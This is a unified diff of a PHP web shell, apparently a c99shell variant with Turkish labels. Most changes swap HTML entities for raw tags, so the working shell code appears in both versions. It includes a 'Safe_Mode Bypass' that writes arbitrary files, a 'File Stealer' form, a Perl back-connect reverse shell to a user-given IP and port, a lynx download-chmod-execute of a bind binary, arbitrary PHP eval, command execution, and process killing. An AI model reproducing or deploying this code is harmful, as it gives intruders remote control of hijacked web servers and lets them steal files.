-&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"&gt;&lt;b&gt;File Stealer Function Ripped fRom Tontonq 's File Stealer ... &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-    &lt;div align="center"&gt;&lt;b&gt;Safe_Mode Bypass&lt;/b&gt;
-    &lt;form action="<?php echo $surl; ?>" method="POST"&gt;
-    &lt;input type=hidden name=act value=tools&gt;
-    &lt;textarea name="erorr" cols=100 rows=10&gt;&lt;/textarea&gt;&lt;/br&gt;
-    &lt;input type="text" name="nere" value="<?echo "$real\index.php";?> "size=84&gt;
-    &lt;input type="submit" value="Write 2 File !!"&gt;
+   </center>
+    </td>
+</tr></TABLE>
+<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>
+<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>File Stealer Function Ripped fRom Tontonq 's File Stealer ... </b></a> ::</b></p></td></tr>
+<tr>
+  <td width="50%" height="83" valign="top"><center>
+    <div align="center"><b>Safe_Mode Bypass</b>
+    <form action="<?php echo $surl; ?>" method="POST">
+    <input type=hidden name=act value=tools>
+    <textarea name="erorr" cols=100 rows=10></textarea></br>
+    <input type="text" name="nere" value="<?echo "$real\index.php";?> "size=84>
+    <input type="submit" value="Write 2 File !!">
     
-    &lt;/form&gt;
-    
-    
+    </form>
     
     
     
@@ -2486,26 +2484,28 @@ Click "Connect" only after open port for it. You should use NetCat&copy;, run "&
     
     
     
-    &lt;/div&gt;
-    &lt;/td&gt;
-  &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-   &lt;center&gt;
-   &lt;form action="<?php echo $surl; ?>" method="POST"&gt;
-   &lt;input type=hidden name=act value=tools&gt;
-   Dosyanin Adresi ? = &lt;input type="text" name="dosyaa" size="81" maxlength=500  value=""&gt;&lt;br&gt;&lt;br&gt;
-Nereya Kaydolcak? = &lt;input type="text" name="yeniyer" size=81 maxlength=191 value="<?php echo "$real/sploitz.zip"; ?>"&gt;&lt;br&gt;&lt;br&gt;
-&lt;input type=submit class='stealthSubmit' Value='Dosyayi Chek'&gt;
-&lt;/form&gt;
-&lt;br&gt;&lt;br&gt;&lt;br&gt;
-   
-   
+    
+    
+    </div>
+    </td>
+  <td width="50%" height="83" valign="top"><center>
+   <center>
+   <form action="<?php echo $surl; ?>" method="POST">
+   <input type=hidden name=act value=tools>
+   Dosyanin Adresi ? = <input type="text" name="dosyaa" size="81" maxlength=500  value=""><br><br>
+Nereya Kaydolcak? = <input type="text" name="yeniyer" size=81 maxlength=191 value="<?php echo "$real/sploitz.zip"; ?>"><br><br>
+<input type=submit class='stealthSubmit' Value='Dosyayi Chek'>
+</form>
+<br><br><br>
    
    
-   &lt;/center&gt;
    
-   &lt;/center&gt;
-    &lt;/td&gt;
-&lt;/tr&gt;&lt;/TABLE&gt;
+   
+   </center>
+   
+   </center>
+    </td>
+</tr></TABLE>
 <?php
 if (isset($_POST['dosyaa']))
 {
@@ -2516,7 +2516,7 @@ if (!empty($_GET['ipi']) && !empty($_GET['pipi']))
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_GET['ipi']." ".$_GET['pipi']." &");
-echo"&lt;b&gt;Now script try connect to ".$_GET['ipi']." port ".$_GET['pipi']." ...&lt;/b&gt;";
+echo"<b>Now script try connect to ".$_GET['ipi']." port ".$_GET['pipi']." ...</b>";
 }
 if (!empty($_GET['dolma']))
 {  
@@ -2532,7 +2532,7 @@ myshellexec("./sayko_bind");
 }
 else if ($sayko == "lynxcan")
 {
-myshellexec("lynx -dump $adires &gt; sayko_bind;chmod 777 sayko_bind;./sayko_bind");
+myshellexec("lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind");
 }
 }
 if  (!empty($_POST['erorr']))
@@ -2542,7 +2542,7 @@ error_log($_POST['erorr'], 3, "php://".$_POST['nere']);
 }
 if ($act == "processes")
 {
-echo "&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;";
+echo "<b>Processes:</b><br>";
 if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");}
 else {$handler = "tasklist";}
 $ret = myshellexec($handler);
@@ -2553,8 +2553,8 @@ else
   $parsesort = parsesort($processes_sort);
   if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
   $k = $parsesort[0];
-  if ($parsesort[1] != "a") {$y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"&gt;&lt;img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;";}
-  else {$y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"&gt;&lt;img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;";}
+  if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
+  else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
   $ret = htmlspecialchars($ret);
   if (!$win)
   {
@@ -2569,23 +2569,23 @@ else
    $stack = explode("\n",$ret);
    $head = explode(" ",$stack[0]);
    unset($stack[0]);
-   for($i=0;$i&lt;count($head);$i++)
+   for($i=0;$i<count($head);$i++)
    {
-    if ($i != $k) {$head[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"&gt;&lt;b&gt;".$head[$i]."&lt;/b&gt;&lt;/a&gt;";}
+    if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";}
    }
    $prcs = array();
    foreach ($stack as $line)
    {
     if (!empty($line))
 {
-echo "&lt;tr&gt;";
+echo "<tr>";
      $line = explode(" ",$line);
      $line[10] = join(" ",array_slice($line,10));
      $line = array_slice($line,0,11);
-     if ($line[0] == get_current_user()) {$line[0] = "&lt;font color=green&gt;".$line[0]."&lt;/font&gt;";}
-     $line[] = "&lt;a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"&gt;&lt;u&gt;KILL&lt;/u&gt;&lt;/a&gt;";
+     if ($line[0] == get_current_user()) {$line[0] = "<font color=green>".$line[0]."</font>";}
+     $line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
      $prcs[] = $line;
-     echo "&lt;/tr&gt;";
+     echo "</tr>";
     }
    }
   }
@@ -2612,49 +2612,49 @@ echo "&lt;tr&gt;";
    $stack = array_slice($stack,1);
    unset($head[2]);
    $head = array_values($head);
-   if ($parsesort[1] != "a") {$y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"&gt;&lt;img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;";}
-   else {$y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"&gt;&lt;img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;";}
-   if ($k &gt; count($head)) {$k = count($head)-1;}
-   for($i=0;$i&lt;count($head);$i++)
+   if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
+   else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
+   if ($k > count($head)) {$k = count($head)-1;}
+   for($i=0;$i<count($head);$i++)
    {
-    if ($i != $k) {$head[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"&gt;&lt;b&gt;".trim($head[$i])."&lt;/b&gt;&lt;/a&gt;";}
+    if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>";}
    }
    $prcs = array();
    foreach ($stack as $line)
    {
     if (!empty($line))
     {
-     echo "&lt;tr&gt;";
+     echo "<tr>";
      $line = explode("",$line);
      $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);
      $line[2] = intval(str_replace(" ","",$line[2]))*1024;  
      $prcs[] = $line;
-     echo "&lt;/tr&gt;";
+     echo "</tr>";
     }
    }
   }
-  $head[$k] = "&lt;b&gt;".$head[$k]."&lt;/b&gt;".$y;
+  $head[$k] = "<b>".$head[$k]."</b>".$y;
   $v = $processes_sort[0];
   usort($prcs,"tabsort");
   if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}
   $tab = array();
   $tab[] = $head;
   $tab = array_merge($tab,$prcs);
-  echo "&lt;TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"&gt;";
-  foreach($tab as $i=&gt;$k)
+  echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";
+  foreach($tab as $i=>$k)
   {
-   echo "&lt;tr&gt;";
-   foreach($k as $j=&gt;$v) {if ($win and $i &gt; 0 and $j == 2) {$v = view_size($v);} echo "&lt;td&gt;".$v."&lt;/td&gt;";}
-   echo "&lt;/tr&gt;";
+   echo "<tr>";
+   foreach($k as $j=>$v) {if ($win and $i > 0 and $j == 2) {$v = view_size($v);} echo "<td>".$v."</td>";}
+   echo "</tr>";
   }
-  echo "&lt;/table&gt;";
+  echo "</table>";
 }
 }
 if ($act == "eval")
 {
 if (!empty($eval))
 {
-  echo "&lt;b&gt;Result of execution this PHP-code&lt;/b&gt;:&lt;br&gt;";
+  echo "<b>Result of execution this PHP-code</b>:<br>";
   $tmp = ob_get_contents();
   $olddir = realpath(".");
   @chdir($d);
@@ -2669,32 +2669,32 @@ if (!empty($eval))
    if ($eval_txt)
    {
     $rows = count(explode("\r\n",$ret))+1;
-    if ($rows &lt; 10) {$rows = 10;}
-    echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"".$rows."\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;";
+    if ($rows < 10) {$rows = 10;}
+    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
    }
-   else {echo $ret."&lt;br&gt;";}
+   else {echo $ret."<br>";}
   }
   else
   {
    if ($eval_txt)
    {
-    echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"15\" readonly&gt;";
+    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
     eval($eval);
-    echo "&lt;/textarea&gt;";
+    echo "</textarea>";
    }
    else {echo $ret;}
   }
   @chdir($olddir);
 }
-else {echo "&lt;b&gt;Execution PHP-code&lt;/b&gt;"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
-echo "&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=eval&gt;&lt;textarea name=\"eval\" cols=\"122\" rows=\"10\"&gt;".htmlspecialchars($eval)."&lt;/textarea&gt;&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit value=\"Execute\"&gt;&nbsp;Display in text-area&nbsp;&lt;input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "&gt;&lt;/form&gt;";
+else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
+echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
 }
 if ($act == "f")
 {
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
-  if (file_exists($d.$f)) {echo "&lt;center&gt;&lt;b&gt;Permision denied (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;/center&gt;";}
-  else {echo "&lt;center&gt;&lt;b&gt;File does not exists (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;br&gt;&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"&gt;&lt;u&gt;Create&lt;/u&gt;&lt;/a&gt;&lt;/center&gt;";}
+  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
+  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
 }
 else
 {
@@ -2704,58 +2704,58 @@ else
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
-  foreach($ftypes as $k=&gt;$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
+  foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
   if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
   if (empty($ft)) {$ft = $rft;}
   $arr = array(
-   array("&lt;img src=\"".$surl."act=img&img=ext_diz\" border=\"0\"&gt;","info"),
-   array("&lt;img src=\"".$surl."act=img&img=ext_html\" border=\"0\"&gt;","html"),
-   array("&lt;img src=\"".$surl."act=img&img=ext_txt\" border=\"0\"&gt;","txt"),
+   array("<img src=\"".$surl."act=img&img=ext_diz\" border=\"0\">","info"),
+   array("<img src=\"".$surl."act=img&img=ext_html\" border=\"0\">","html"),
+   array("<img src=\"".$surl."act=img&img=ext_txt\" border=\"0\">","txt"),
    array("Code","code"),
    array("Session","phpsess"),
-   array("&lt;img src=\"".$surl."act=img&img=ext_exe\" border=\"0\"&gt;","exe"),
+   array("<img src=\"".$surl."act=img&img=ext_exe\" border=\"0\">","exe"),
    array("SDB","sdb"),
-   array("&lt;img src=\"".$surl."act=img&img=ext_gif\" border=\"0\"&gt;","img"),
-   array("&lt;img src=\"".$surl."act=img&img=ext_ini\" border=\"0\"&gt;","ini"),
-   array("&lt;img src=\"".$surl."act=img&img=download\" border=\"0\"&gt;","download"),
-   array("&lt;img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\"&gt;","notepad"),
-   array("&lt;img src=\"".$surl."act=img&img=change\" border=\"0\"&gt;","edit")
+   array("<img src=\"".$surl."act=img&img=ext_gif\" border=\"0\">","img"),
+   array("<img src=\"".$surl."act=img&img=ext_ini\" border=\"0\">","ini"),
+   array("<img src=\"".$surl."act=img&img=download\" border=\"0\">","download"),
+   array("<img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\">","notepad"),
+   array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")
   );
-  echo "&lt;b&gt;Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;&lt;img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\"&gt;&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."&lt;/b&gt;&lt;br&gt;Select action/file-type:&lt;br&gt;";
+  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";
   foreach($arr as $t)
   {
-   if ($t[1] == $rft) {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;font color=green&gt;".$t[0]."&lt;/font&gt;&lt;/a&gt;";}
-   elseif ($t[1] == $ft) {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;b&gt;&lt;u&gt;".$t[0]."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;";}
-   else {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;b&gt;".$t[0]."&lt;/b&gt;&lt;/a&gt;";}
-   echo " (&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\"&gt;+&lt;/a&gt;) |";
+   if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";}
+   elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
+   else {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}
+   echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
   }
-  echo "&lt;hr size=\"1\" noshade&gt;";
+  echo "<hr size=\"1\" noshade>";
   if ($ft == "info")
   {
-   echo "&lt;b&gt;Information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Path&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".$d.$f."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".view_size(filesize($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MD5&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".md5_file($d.$f)."&lt;/td&gt;&lt;/tr&gt;";
+   echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
    if (!$win)
    {
-    echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";     
+    echo "<tr><td><b>Owner/Group</b></td><td> ";     
     $ow = posix_getpwuid(fileowner($d.$f));
     $gr = posix_getgrgid(filegroup($d.$f));
     echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
    }
-   echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\"&gt;".view_perms_color($d.$f)."&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
+   echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";
    $fi = fopen($d.$f,"rb");
    if ($fi)
    {
-    if ($fullhexdump) {echo "&lt;b&gt;FULL HEXDUMP&lt;/b&gt;"; $str = fread($fi,filesize($d.$f));}
-    else {echo "&lt;b&gt;HEXDUMP PREVIEW&lt;/b&gt;"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
+    if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}
+    else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
     $n = 0;
-    $a0 = "00000000&lt;br&gt;";
+    $a0 = "00000000<br>";
     $a1 = "";
     $a2 = "";
-    for ($i=0; $i&lt;strlen($str); $i++)
+    for ($i=0; $i<strlen($str); $i++)
     {
      $a1 .= sprintf("%02X",ord($str[$i]))." ";
      switch (ord($str[$i]))
      {
-      case 0:  $a2 .= "&lt;font&gt;0&lt;/font&gt;"; break;
+      case 0:  $a2 .= "<font>0</font>"; break;
       case 32:
       case 10:
       case 13: $a2 .= "&nbsp;"; break;
@@ -2765,28 +2765,28 @@ else
      if ($n == $hexdump_rows)
      {
       $n = 0;
-      if ($i+1 &lt; strlen($str)) {$a0 .= sprintf("%08X",$i+1)."&lt;br&gt;";}
-      $a1 .= "&lt;br&gt;";
-      $a2 .= "&lt;br&gt;";
+      if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
+      $a1 .= "<br>";
+      $a2 .= "<br>";
      }
     }
-    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."&lt;br&gt;";}
-    echo "&lt;table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4&gt;&lt;tr&gt;&lt;td bgcolor=#666666&gt;".$a0."&lt;/td&gt;&lt;td bgcolor=000000&gt;".$a1."&lt;/td&gt;&lt;td bgcolor=000000&gt;".$a2."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
+    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."<br>";}
+    echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>".$a0."</td><td bgcolor=000000>".$a1."</td><td bgcolor=000000>".$a2."</td></tr></table><br>";
    }
    $encoded = "";
    if ($base64 == 1)
    {
-    echo "&lt;b&gt;Base64 Encode&lt;/b&gt;&lt;br&gt;";
+    echo "<b>Base64 Encode</b><br>";
     $encoded = base64_encode(file_get_contents($d.$f));
    }
    elseif($base64 == 2)
    {
-    echo "&lt;b&gt;Base64 Encode + Chunk&lt;/b&gt;&lt;br&gt;";
+    echo "<b>Base64 Encode + Chunk</b><br>";
     $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
    }
    elseif($base64 == 3)
    {
-    echo "&lt;b&gt;Base64 Encode + Chunk + Quotes&lt;/b&gt;&lt;br&gt;";
+    echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
     $encoded = base64_encode(file_get_contents($d.$f));
     $encoded = substr(preg_replace("!.{1,76}!","'\&#92;&#48;'.\n",$encoded),0,-2);
    }
@@ -2794,20 +2794,20 @@ else
    {
     $text = file_get_contents($d.$f);
     $encoded = base64_decode($text);
-    echo "&lt;b&gt;Base64 Decode";
+    echo "<b>Base64 Decode";
     if (base64_encode($encoded) != $text) {echo " (failed)";}
-    echo "&lt;/b&gt;&lt;br&gt;";
+    echo "</b><br>";
    }
    if (!empty($encoded))
    {
-    echo "&lt;textarea cols=80 rows=10&gt;".htmlspecialchars($encoded)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;";
+    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
    }
-   echo "&lt;b&gt;HEXDUMP:&lt;/b&gt;&lt;nobr&gt; [&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\"&gt;Full&lt;/a&gt;] [&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\"&gt;Preview&lt;/a&gt;]&lt;br&gt;&lt;b&gt;Base64: &lt;/b&gt;
-&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\"&gt;Encode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
-&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\"&gt;+chunk&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
-&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\"&gt;+chunk+quotes&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
-&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\"&gt;Decode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
-&lt;P&gt;";
+   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
+<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
+<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
+<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
+<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
+<P>";
   }
   elseif ($ft == "html")
   {
@@ -2815,15 +2815,15 @@ else
    echo $r;
    if ($white) {c99shexit();}
   }
-  elseif ($ft == "txt") {echo "&lt;pre&gt;".htmlspecialchars($r)."&lt;/pre&gt;";}
-  elseif ($ft == "ini") {echo "&lt;pre&gt;"; var_dump(parse_ini_file($d.$f,TRUE)); echo "&lt;/pre&gt;";}
+  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
+  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}
   elseif ($ft == "phpsess")
   {
-   echo "&lt;pre&gt;";
+   echo "<pre>";
    $v = explode("|",$r);
-   echo $v[0]."&lt;br&gt;";
+   echo $v[0]."<br>";
    var_dump(unserialize($v[1]));
-   echo "&lt;/pre&gt;";
+   echo "</pre>";
   }
   elseif ($ft == "exe")
   {
@@ -2832,14 +2832,14 @@ else
    $ext = $ext[$c];
    $ext = strtolower($ext);
    $rft = "";
-   foreach($exeftypes as $k=&gt;$v)
+   foreach($exeftypes as $k=>$v)
    {
     if (in_array($ext,$v)) {$rft = $k; break;}
    }
    $cmd = str_replace("%f%",$f,$rft);
-   echo "&lt;b&gt;Execute file:&lt;/b&gt;&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=cmd&gt;&lt;input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"&gt;&lt;br&gt;Display in text-area&lt;input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked&gt;&lt;input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Execute\"&gt;&lt;/form&gt;";
+   echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
   }
-  elseif ($ft == "sdb") {echo "&lt;pre&gt;"; var_dump(unserialize(base64_decode($r))); echo "&lt;/pre&gt;";}
